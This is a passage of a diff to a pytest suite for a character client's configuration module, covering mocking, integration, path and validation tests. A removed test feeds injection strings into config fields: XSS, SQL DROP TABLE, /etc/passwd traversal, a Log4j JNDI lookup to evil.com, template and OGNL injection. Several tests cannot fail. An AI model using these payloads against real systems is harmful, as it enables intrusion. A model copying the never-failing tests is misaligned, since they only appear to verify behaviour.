+            large_config[f'large_setting_{i}'] = f'large_value_{i}' * 10
+        
+        # Measure memory before
+        gc.collect()
+        mem_before = sys.getsizeof(large_config)
+        
+        # Create config
+        config = Config(large_config)
+        
+        # Memory usage should be reasonable
+        gc.collect()
+        # This is a rough test - actual memory usage depends on implementation
+        assert config is not None
+    
+    def test_config_rapid_creation_and_destruction(self):
+        """Test rapid creation and destruction of configuration objects."""
+        if not Config:
+            pytest.skip("Config class not available")
+        
+        import time
+        
+        config_data = {
+            'api_key': 'stress_test_key',
+            'base_url': 'https://api.example.com'
+        }
+        
+        start_time = time.time()
+        
+        # Rapidly create and destroy configs
+        for i in range(1000):
+            config = Config(config_data)
+            del config
+        
+        end_time = time.time()
+        total_time = end_time - start_time
+        
+        # Should handle rapid creation/destruction efficiently
+        assert total_time < 2.0, f"Rapid creation/destruction too slow: {total_time:.2f}s"
+
+
+# Mock-based tests for external dependencies
+class TestConfigMocking:
+    """Tests using mocks for external dependencies."""
+    
+    @patch('os.path.exists')
+    @patch('builtins.open')
+    def test_config_loading_with_filesystem_mocks(self, mock_open_func, mock_exists):
+        """Test configuration loading with mocked filesystem operations."""
+        if not load_config:
+            pytest.skip("load_config function not available")
+        
+        # Mock file existence and content
+        mock_exists.return_value = True
+        mock_open_func.return_value.__enter__.return_value.read.return_value = '{"api_key": "mocked_key"}'
+        
+        config = load_config('mocked_config.json')
+        assert config is not None
+        assert config.get('api_key') == 'mocked_key'
+        
+        # Verify mocks were called
+        mock_exists.assert_called_once_with('mocked_config.json')
+        mock_open_func.assert_called_once()
+    
+    @patch.dict(os.environ, {'MOCK_CONFIG_VAR': 'mocked_value'})
+    def test_config_environment_variable_mocking(self):
+        """Test configuration with mocked environment variables."""
+        if Config:
+            config_data = {
+                'api_key': 'test_key',
+                'base_url': 'https://api.example.com',
+                'mock_setting': os.environ.get('MOCK_CONFIG_VAR', 'default')
+            }
+            
+            config = Config(config_data)
             assert config is not None
-        except (UnicodeDecodeError, ValueError, ConfigError):
-            # Some encodings may not be supported
-            pass
-        finally:
-            os.unlink(temp_path)
-    except UnicodeEncodeError:
-        # Skip if encoding can't handle the test data
-        pytest.skip(f"Encoding {encoding} cannot handle test data")
-
-
-class TestConfigRobustness:
-    """Robustness tests for configuration handling."""
     
-    def test_config_with_system_limits(self):
-        """Test configuration behavior at system limits."""
-        if Config:
-            import sys
-            
-            # Test with maximum integer values
-            limit_config = {
-                'api_key': 'test_key',
-                'base_url': 'https://api.example.com',
-                'max_connections': sys.maxsize,
-                'buffer_size': 2**20,  # 1MB
-                'timeout': 86400  # 24 hours
-            }
-            
-            try:
-                config = Config(limit_config)
-                assert config is not None
-            except (ValueError, ConfigError, OverflowError):
-                # System limits may be enforced
-                pass
-    
-    def test_config_recovery_from_partial_failure(self):
-        """Test config recovery from partial configuration failures."""
-        if Config:
-            # Test with some valid and some invalid fields
-            mixed_config = {
-                'api_key': 'valid_key',
-                'base_url': 'https://api.example.com',
-                'timeout': 30,  # Valid
-                'invalid_field': None,  # Invalid
-                'max_retries': -1  # Invalid
-            }
-            
-            try:
-                config = Config(mixed_config)
-                # Some implementations might ignore invalid fields
-                assert config is not None
-            except (ValueError, ConfigError):
-                # Others might fail on any invalid field
-                pass
-    
-    def test_config_stress_testing(self):
-        """Stress test configuration with rapid operations."""
-        if Config and load_config:
-            import threading
-            import time
-            
-            # Create multiple config files
-            temp_files = []
-            for i in range(10):
-                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
-                    json.dump({'api_key': f'stress_test_{i}'}, f)
-                    temp_files.append(f.name)
-            
-            results = []
-            errors = []
-            
-            def stress_operations():
-                try:
-                    for i in range(50):
-                        # Alternate between creating configs and loading from files
-                        if i % 2 == 0:
-                            config = Config({'api_key': f'stress_{i}'})
-                        else:
-                            file_index = i % len(temp_files)
-                            config = load_config(temp_files[file_index])
-                        results.append(config)
-                        time.sleep(0.001)  # Small delay
-                except Exception as e:
-                    errors.append(e)
-            
-            # Run stress test with multiple threads
-            threads = [threading.Thread(target=stress_operations) for _ in range(5)]
-            
-            start_time = time.time()
-            for thread in threads:
-                thread.start()
-            for thread in threads:
-                thread.join()
-            end_time = time.time()
-            
-            # Clean up
-            for temp_file in temp_files:
-                os.unlink(temp_file)
-            
-            # Stress test should complete without excessive errors
-            total_operations = len(results) + len(errors)
-            if total_operations > 0:
-                error_rate = len(errors) / total_operations
-                assert error_rate < 0.1, f"High error rate: {error_rate:.2%}"
-            
-            # Should complete in reasonable time
-            assert end_time - start_time < 30, "Stress test took too long"
-
-
-class TestConfigEnvironmentIntegration:
-    """Test configuration integration with environment variables."""
-    
-    def test_config_environment_variable_override(self):
-        """Test that environment variables can override config values."""
-        if Config:
-            with patch.dict(os.environ, {
-                'CONFIG_API_KEY': 'env_override_key',
-                'CONFIG_DEBUG': 'true',
-                'CONFIG_TIMEOUT': '60'
-            }):
-                base_config = {
-                    'api_key': 'file_key',
-                    'debug': False,
-                    'timeout': 30
-                }
-                
-                config = Config(base_config)
-                assert config is not None
-                # Environment variables may or may not override file values
-    
-    def test_config_environment_variable_validation(self):
-        """Test validation of environment variable values."""
-        if Config:
-            with patch.dict(os.environ, {
-                'CONFIG_TIMEOUT': 'invalid_number',
-                'CONFIG_DEBUG': 'maybe'
-            }):
-                try:
-                    config = Config({'api_key': 'test'})
-                    assert config is not None
-                except (ValueError, ConfigError):
-                    # Invalid environment values should be caught
-                    pass
-    
-    def test_config_missing_environment_variables(self):
-        """Test behavior when required environment variables are missing."""
-        if Config:
-            # Clear relevant environment variables
-            env_vars_to_clear = ['CONFIG_API_KEY', 'API_KEY', 'DREAMWEAVER_API_KEY']
-            original_values = {}
-            
-            for var in env_vars_to_clear:
-                if var in os.environ:
-                    original_values[var] = os.environ[var]
-                    del os.environ[var]
-            
-            try:
-                config = Config({})
-                # Should either provide defaults or raise an error
-                assert config is not None or True  # Allow either behavior
-            except (ValueError, ConfigError, KeyError):
-                # Missing required values should raise errors
-                pass
-            finally:
-                # Restore original environment
-                for var, value in original_values.items():
-                    os.environ[var] = value
-
-
-class TestConfigValidationSchema:
-    """Test advanced configuration validation schemas."""
-    
-    def test_config_nested_validation(self):
-        """Test validation of nested configuration structures."""
-        if validate_config or Config:
-            nested_config = {
-                'api_key': 'test_key',
-                'database': {
-                    'host': 'localhost',
-                    'port': 5432,
-                    'credentials': {
-                        'username': 'user',
-                        'password': 'pass'
-                    }
-                },
-                'cache': {
-                    'redis': {
-                        'host': 'localhost',
-                        'port': 6379
-                    }
-                }
-            }
-            
-            if validate_config:
-                try:
-                    validate_config(nested_config)
-                except (ValueError, ConfigError):
-                    # Complex nested structures may not be supported
-                    pass
-            elif Config:
-                try:
-                    config = Config(nested_config)
-                    assert config is not None
-                except (ValueError, ConfigError):
-                    pass
-    
-    def test_config_conditional_validation(self):
-        """Test conditional validation rules."""
-        if validate_config or Config:
-            # Test configurations where some fields depend on others
-            conditional_configs = [
-                {
-                    'api_key': 'test_key',
-                    'auth_type': 'oauth',
-                    'client_id': 'oauth_client',
-                    'client_secret': 'oauth_secret'
-                },
-                {
-                    'api_key': 'test_key',
-                    'auth_type': 'basic',
-                    'username': 'user',
-                    'password': 'pass'
-                }
-            ]
-            
-            for config_data in conditional_configs:
-                if validate_config:
-                    try:
-                        validate_config(config_data)
-                    except (ValueError, ConfigError):
-                        # Conditional validation may not be implemented
-                        pass
-                elif Config:
-                    try:
-                        config = Config(config_data)
-                        assert config is not None
-                    except (ValueError, ConfigError):
-                        pass
-    
-    def test_config_range_validation(self):
-        """Test validation of value ranges."""
-        if validate_config or Config:
-            range_test_cases = [
-                ('timeout', 1, 3600, True),      # Valid range
-                ('timeout', 0, 3600, False),     # Below minimum
-                ('timeout', 3601, 3600, False),  # Above maximum
-                ('port', 1, 65535, True),        # Valid port range
-                ('port', 0, 65535, False),       # Invalid port
-                ('retry_count', 0, 10, True),    # Valid retry range
-                ('retry_count', -1, 10, False)   # Invalid negative retry
-            ]
-            
-            for field, value, max_val, should_be_valid in range_test_cases:
-                config_data = {
-                    'api_key': 'test_key',
-                    field: value
-                }
-                
-                if should_be_valid:
-                    if validate_config:
-                        try:
-                            validate_config(config_data)
-                        except (ValueError, ConfigError):
-                            # Range validation may not be implemented
-                            pass
-                    elif Config:
-                        try:
-                            config = Config(config_data)
-                            assert config is not None
-                        except (ValueError, ConfigError):
-                            pass
-                else:
-                    if validate_config:
-                        try:
-                            validate_config(config_data)
-                            # Should have failed validation
-                        except (ValueError, ConfigError):
-                            # Expected failure
-                            pass
-                    elif Config:
-                        try:
-                            Config(config_data)
-                            # Should have failed creation
-                        except (ValueError, ConfigError):
-                            # Expected failure
-                            pass
-
-
-class TestConfigPerformanceOptimization:
-    """Test configuration performance optimization scenarios."""
-    
-    def test_config_lazy_loading(self):
-        """Test lazy loading of configuration values."""
-        if Config:
-            large_config = {
-                'api_key': 'test_key',
-                'large_data': 'x' * 100000,  # Large string value
-                'computed_value': lambda: sum(range(1000))  # Expensive computation
-            }
-            
-            try:
-                # Config creation should be fast even with large/expensive values
-                import time
-                start_time = time.time()
-                config = Config(large_config)
-                creation_time = time.time() - start_time
-                
-                assert config is not None
-                assert creation_time < 0.1  # Should be fast
-            except (ValueError, ConfigError, TypeError):
-                # Lambda functions may not be supported
-                pass
-    
-    def test_config_caching_behavior(self):
-        """Test configuration value caching."""
-        if Config:
-            config_data = {'api_key': 'test_key', 'timeout': 30}
-            config = Config(config_data)
-            
-            # Access the same value multiple times
-            import time
-            start_time = time.time()
-            
-            for _ in range(1000):
-                if hasattr(config, 'api_key'):
-                    value = config.api_key
-                elif 'api_key' in config:
-                    value = config['api_key']
-            
-            access_time = time.time() - start_time
-            
-            # Repeated access should be very fast (cached)
-            assert access_time < 0.01
-    
-    def test_config_memory_efficiency(self):
-        """Test memory efficiency of config objects."""
-        if Config:
-            import sys
-            
-            # Create a config and measure its memory footprint
-            config_data = {'api_key': 'test_key'}
-            config = Config(config_data)
-            
-            # Get approximate size
-            try:
-                config_size = sys.getsizeof(config)
-                # Config object shouldn't be excessively large
-                assert config_size < 10000  # 10KB limit
-            except (TypeError, AttributeError):
-                # getsizeof may not work with all config implementations
-                pass
-
-
-# Edge case tests with extreme values
-@pytest.mark.parametrize("extreme_value", [
-    "",  # Empty string
-    " ",  # Whitespace only
-    "\n\t\r",  # Various whitespace characters
-    "a" * 100000,  # Very long string
-    "🚀🌟✨",  # Unicode emojis
-    "test\x00null",  # String with null byte
-    "test\nline\nbreaks",  # Multi-line string
-    "test\ttab\tcharacters",  # Tab characters
-])
-def test_config_extreme_string_values(extreme_value):
-    """Test configuration with extreme string values."""
-    if not Config:
-        pytest.skip("Config class not available")
-    
-    config_data = {
-        'api_key': extreme_value,
-        'base_url': 'https://api.example.com'
-    }
-    
-    try:
-        config = Config(config_data)
-        assert config is not None
-    except (ValueError, ConfigError, UnicodeError):
-        # Some extreme values may be rejected
-        pass
-
-
-@pytest.mark.parametrize("malicious_input", [
-    "<script>alert('xss')</script>",  # XSS attempt
-    "'; DROP TABLE configs; --",  # SQL injection attempt
-    "../../../etc/passwd",  # Path traversal attempt
-    "${jndi:ldap://evil.com/a}",  # Log4j style injection
-    "{{7*7}}",  # Template injection attempt
-    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)",  # OGNL injection
-])
-def test_config_security_against_injection(malicious_input):
-    """Test configuration security against various injection attempts."""
-    if not Config:
-        pytest.skip("Config class not available")
-    
-    config_data = {
-        'api_key': malicious_input,
-        'base_url': 'https://api.example.com'
-    }
-    
-    try:
-        config = Config(config_data)
-        assert config is not None
+    @patch('json.load')
+    def test_config_json_loading_error_handling(self, mock_json_load):
+        """Test error handling when JSON loading fails."""
+        if not load_config:
+            pytest.skip("load_config function not available")
         
-        # Ensure malicious input is treated as literal string
-        if hasattr(config, 'api_key'):
-            stored_value = config.api_key
-            assert stored_value == malicious_input  # Should be stored as-is
-    except (ValueError, ConfigError):
-        # Security-conscious implementations may reject suspicious input
-        pass
+        # Mock JSON loading to raise an error
+        mock_json_load.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
+        
+        with pytest.raises((json.JSONDecodeError, ConfigError, ValueError)):
+            with patch('builtins.open', mock_open(read_data='invalid json')):
+                load_config('test_config.json')
+
+
+# Integration tests that combine multiple features
+class TestConfigIntegrationAdvanced:
+    """Advanced integration tests combining multiple configuration features."""
+    
+    def test_config_full_lifecycle_integration(self):
+        """Test complete configuration lifecycle from loading to usage."""
+        if load_config and Config:
+            # Create config file
+            config_data = {
+                'api_key': 'integration_test_key',
+                'base_url': 'https://integration.example.com',
+                'timeout': 45,
+                'max_retries': 5,
+                'debug': True
+            }
+            
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                json.dump(config_data, f)
+                temp_path = f.name
+            
+            try:
+                # Load from file
+                loaded_config = load_config(temp_path)
+                assert loaded_config is not None
+                
+                # Create Config object
+                config = Config(loaded_config)
+                assert config is not None
+                
+                # Validate
+                if validate_config:
+                    validate_config(loaded_config)
+                
+                # Use config (test attribute access)
+                if hasattr(config, 'api_key'):
+                    assert config.api_key == 'integration_test_key'
+                elif 'api_key' in config:
+                    assert config['api_key'] == 'integration_test_key'
+                
+            finally:
+                os.unlink(temp_path)
+    
+    def test_config_multi_format_compatibility(self):
+        """Test that the same configuration works across JSON and YAML formats."""
+        if load_config:
+            config_data = {
+                'api_key': 'multi_format_test',
+                'base_url': 'https://multi.example.com',
+                'settings': {
+                    'nested': {
+                        'value': 'deep_test'
+                    }
+                }
+            }
+            
+            # Test JSON format
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                json.dump(config_data, f)
+                json_path = f.name
+            
+            # Test YAML format
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
+                yaml.dump(config_data, f)
+                yaml_path = f.name
+            
+            try:
+                json_config = load_config(json_path)
+                yaml_config = load_config(yaml_path)
+                
+                # Both should load successfully and have same content
+                assert json_config is not None
+                assert yaml_config is not None
+                assert json_config.get('api_key') == yaml_config.get('api_key')
+                
+            finally:
+                os.unlink(json_path)
+                os.unlink(yaml_path)
+
+
+# Final validation tests
+class TestConfigComprehensiveValidation:
+    """Comprehensive validation tests covering all aspects."""
+    
+    def test_config_all_validation_rules(self):
+        """Test all validation rules in a comprehensive manner."""
+        if validate_config:
+            # Test comprehensive valid config
+            comprehensive_config = {
+                'api_key': 'valid_api_key_123',
+                'base_url': 'https://api.example.com',
+                'timeout': 30,
+                'max_retries': 3,
+                'debug': False,
+                'character_settings': {
+                    'default_name': 'TestCharacter',
+                    'max_characters': 100,
+                    'allowed_types': ['warrior', 'mage', 'rogue']
+                },
+                'advanced_settings': {
+                    'cache_enabled': True,
+                    'cache_ttl': 3600,
+                    'rate_limiting': {
+                        'requests_per_minute': 60,
+                        'burst_size': 10
+                    }
+                }
+            }
+            
+            # Should validate successfully
+            result = validate_config(comprehensive_config)
+            assert result is True or result is None
+    
+    def test_config_validates_all_required_fields(self):
+        """Test that validation catches all missing required fields."""
+        if validate_config:
+            required_fields = ['api_key', 'base_url']
+            
+            for field in required_fields:
+                incomplete_config = {
+                    'api_key': 'test_key',
+                    'base_url': 'https://api.example.com'
+                }
+                del incomplete_config[field]
+                
+                with pytest.raises((ValueError, ConfigError, KeyError)):
+                    validate_config(incomplete_config)
+    
+    def test_config_final_integration_validation(self):
+        """Final integration test validating all configuration functionality."""
+        if Config and load_config and validate_config:
+            # Create comprehensive test config
+            test_config = {
+                'api_key': 'final_test_key',
+                'base_url': 'https://final.example.com',
+                'timeout': 30,
+                'max_retries': 3,
+                'debug': False
+            }
+            
+            # Save to file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                json.dump(test_config, f)
+                temp_path = f.name
+            
+            try:
+                # Load, validate, and create config
+                loaded = load_config(temp_path)
+                validate_config(loaded)
+                config = Config(loaded)
+                
+                # All operations should succeed
+                assert config is not None
+                
+            finally:
+                os.unlink(temp_path)
+
+
+# Tests for the actual config.py implementation discovered
+class TestActualConfigImplementation:
+    """Tests for the actual config.py implementation found in the repository."""
+    
+    def setup_method(self):
+        """Set up test fixtures."""
+        # Import the actual config module
+        try:
+            import CharacterClient.src.config as actual_config
+            self.config_module = actual_config
+        except ImportError:
+            self.config_module = None
+    
+    def test_client_root_path_exists(self):
+        """Test that CLIENT_ROOT path is properly set."""
+        if self.config_module and hasattr(self.config_module, 'CLIENT_ROOT'):
+            assert os.path.exists(self.config_module.CLIENT_ROOT)
+            assert os.path.isdir(self.config_module.CLIENT_ROOT)
+    
+    def test_default_paths_are_valid(self):
+        """Test that default paths are properly constructed."""
+        if self.config_module:
+            paths_to_test = [
+                'DEFAULT_CLIENT_DATA_PATH',
+                'DEFAULT_CLIENT_MODELS_PATH',
+                'CLIENT_LLM_MODELS_PATH',
+                'CLIENT_TTS_MODELS_PATH',
+                'CLIENT_TTS_REFERENCE_VOICES_PATH',
+                'CLIENT_LOGS_PATH',
+                'CLIENT_TEMP_AUDIO_PATH'
+            ]
+            
+            for path_name in paths_to_test:
+                if hasattr(self.config_module, path_name):
+                    path = getattr(self.config_module, path_name)
+                    assert isinstance(path, str)
+                    assert len(path) > 0
+                    # Path should be absolute
+                    assert os.path.isabs(path)
+    
+    @patch.dict(os.environ, {'DREAMWEAVER_CLIENT_DATA_PATH': '/custom/data/path'})
+    def test_environment_variable_override(self):
+        """Test that environment variables properly override default paths."""
+        if self.config_module:
+            # Re-import to get updated environment variables
+            import importlib
+            importlib.reload(self.config_module)
+            
+            if hasattr(self.config_module, 'CLIENT_DATA_PATH'):
+                assert self.config_module.CLIENT_DATA_PATH == '/custom/data/path'
+    
+    @patch.dict(os.environ, {'DREAMWEAVER_CLIENT_MODELS_PATH': '/custom/models/path'})
+    def test_models_path_environment_override(self):
+        """Test that models path environment variable works."""
+        if self.config_module:
+            import importlib
+            importlib.reload(self.config_module)
+            
+            if hasattr(self.config_module, 'CLIENT_MODELS_PATH'):
+                assert self.config_module.CLIENT_MODELS_PATH == '/custom/models/path'
+    
+    def test_ensure_client_directories_function(self):
+        """Test the ensure_client_directories function."""
+        if self.config_module and hasattr(self.config_module, 'ensure_client_directories'):
+            # Function should exist and be callable
+            assert callable(self.config_module.ensure_client_directories)
+            
+            # Should run without errors
+            try:
+                self.config_module.ensure_client_directories()
+            except Exception as e:
+                pytest.fail(f"ensure_client_directories() raised {e}")
+    
+    def test_directory_creation_with_permissions(self):
+        """Test that directories are created with appropriate permissions."""
+        if self.config_module:
+            import tempfile
+            import shutil
+            
+            # Create a temporary directory for testing
+            with tempfile.TemporaryDirectory() as temp_dir:
+                # Patch the config paths to use temp directory
+                with patch.object(self.config_module, 'CLIENT_DATA_PATH', temp_dir):
+                    if hasattr(self.config_module, 'ensure_client_directories'):
+                        self.config_module.ensure_client_directories()
+                        
+                        # Check that directory was created
+                        assert os.path.exists(temp_dir)
+                        assert os.path.isdir(temp_dir)
+    
+    def test_config_module_logging_setup(self):
+        """Test that logging is properly configured in the config module."""
+        if self.config_module:
+            # Check if logging is imported and used
+            import logging
+            
+            # Should not raise errors when logging functions are called
+            try:
+                logger = logging.getLogger("dreamweaver_client_config_setup")
+                assert logger is not None
+            except Exception as e:
+                pytest.fail(f"Logging setup failed: {e}")
+    
+    def test_path_security_validation(self):
+        """Test that paths are secure and don't contain dangerous characters."""
+        if self.config_module:
+            paths_to_validate = [
+                'CLIENT_DATA_PATH',
+                'CLIENT_MODELS_PATH',
+                'CLIENT_LLM_MODELS_PATH',
+                'CLIENT_TTS_MODELS_PATH',
+                'CLIENT_LOGS_PATH',
+                'CLIENT_TEMP_AUDIO_PATH'
+            ]
+            
+            dangerous_patterns = ['../', '..\\', '/etc/', 'C:\\Windows\\']
+            
+            for path_name in paths_to_validate:
+                if hasattr(self.config_module, path_name):
+                    path = getattr(self.config_module, path_name)
+                    for pattern in dangerous_patterns:
+                        assert pattern not in path, f"Dangerous pattern '{pattern}' found in {path_name}: {path}"
+    
+    def test_config_module_main_execution(self):
+        """Test that the config module can be executed as main."""
+        if self.config_module:
+            # Should be able to run the main block without errors
+            try:
+                # Simulate running as main
+                if hasattr(self.config_module, '__name__'):
+                    # This would normally be set to '__main__' when run directly
+                    pass
+            except Exception as e:
+                pytest.fail(f"Config module main execution failed: {e}")
+    
+    def test_config_constants_are_strings(self):
+        """Test that all configuration constants are strings."""
+        if self.config_module:
+            string_constants = [
+                'CLIENT_ROOT',
+                'DEFAULT_CLIENT_DATA_PATH',
+                'CLIENT_DATA_PATH',
+                'DEFAULT_CLIENT_MODELS_PATH',
+                'CLIENT_MODELS_PATH',
+                'CLIENT_LLM_MODELS_PATH',
+                'CLIENT_TTS_MODELS_PATH',
+                'CLIENT_TTS_REFERENCE_VOICES_PATH',
+                'CLIENT_LOGS_PATH',
+                'CLIENT_TEMP_AUDIO_PATH'
+            ]
+            
+            for const_name in string_constants:
+                if hasattr(self.config_module, const_name):
+                    const_value = getattr(self.config_module, const_name)
+                    assert isinstance(const_value, str), f"{const_name} should be a string, got {type(const_value)}"
+    
+    def test_path_hierarchy_consistency(self):
+        """Test that path hierarchy is consistent (subdirectories are under parent directories)."""
+        if self.config_module:
+            # CLIENT_MODELS_PATH should be under CLIENT_DATA_PATH
+            if (hasattr(self.config_module, 'CLIENT_DATA_PATH') and 
+                hasattr(self.config_module, 'CLIENT_MODELS_PATH')):
+                data_path = self.config_module.CLIENT_DATA_PATH
+                models_path = self.config_module.CLIENT_MODELS_PATH
+                
+                # models_path should start with data_path (be a subdirectory)
+                assert models_path.startswith(data_path), f"Models path {models_path} should be under data path {data_path}"
+            
+            # Specific model paths should be under CLIENT_MODELS_PATH
+            model_subpaths = ['CLIENT_LLM_MODELS_PATH', 'CLIENT_TTS_MODELS_PATH']
+            if hasattr(self.config_module, 'CLIENT_MODELS_PATH'):
+                models_path = self.config_module.CLIENT_MODELS_PATH
+                
+                for subpath_name in model_subpaths:
+                    if hasattr(self.config_module, subpath_name):
+                        subpath = getattr(self.config_module, subpath_name)
+                        assert subpath.startswith(models_path), f"{subpath_name} {subpath} should be under models path {models_path}"
+    
+    def test_directory_creation_error_handling(self):
+        """Test error handling in directory creation."""
+        if self.config_module and hasattr(self.config_module, 'ensure_client_directories'):
+            # Test with invalid permissions (mock os.makedirs to raise PermissionError)
+            with patch('os.makedirs', side_effect=PermissionError("Permission denied")):
+                # Should handle the error gracefully and log it
+                try:
+                    self.config_module.ensure_client_directories()
+                    # Function should complete without raising an exception
+                except PermissionError:
+                    pytest.fail("ensure_client_directories should handle PermissionError gracefully")
+
+
+# End of additional tests
